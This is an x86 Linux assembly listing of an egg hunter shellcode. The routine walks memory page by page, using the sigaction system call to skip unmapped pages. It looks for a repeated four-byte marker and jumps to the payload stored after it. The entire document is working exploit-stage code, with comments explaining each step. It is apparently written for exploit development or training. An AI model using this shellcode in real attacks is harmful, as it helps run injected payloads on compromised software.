global _start			

section .text

_start:
	xor	ecx, ecx	;; Initialize ecx, will be used as counter
	jmp	short inc_addr	;; move to next address first

inc_page:
	or	cx, 0x0fff	;; Move to another page

inc_addr:
	inc	ecx		;; Move to address+1
	push	0x43		;; sigaction(2) systemcall
	pop	eax		;; classic push-pop technique, not using mov
	int	0x80		;; Interrupt to call sigaction

verify_efault:
	cmp	al, 0xf2	; do we get EFAULT for ecx address?
	jz	inc_page	; 0 means we got efault in this page. Move the page
	
is_egg:
	mov	eax, 0x40414243 ; place identifier in eax
	mov	edi, ecx	; place the address to edi
	scasd			; eax == edi?
	jnz	inc_addr	; loop for next address
	scasd			; eax == [edi+4]?
	jnz	inc_addr	; loop for next address
	jmp	edi		; egg found!, jump to payload
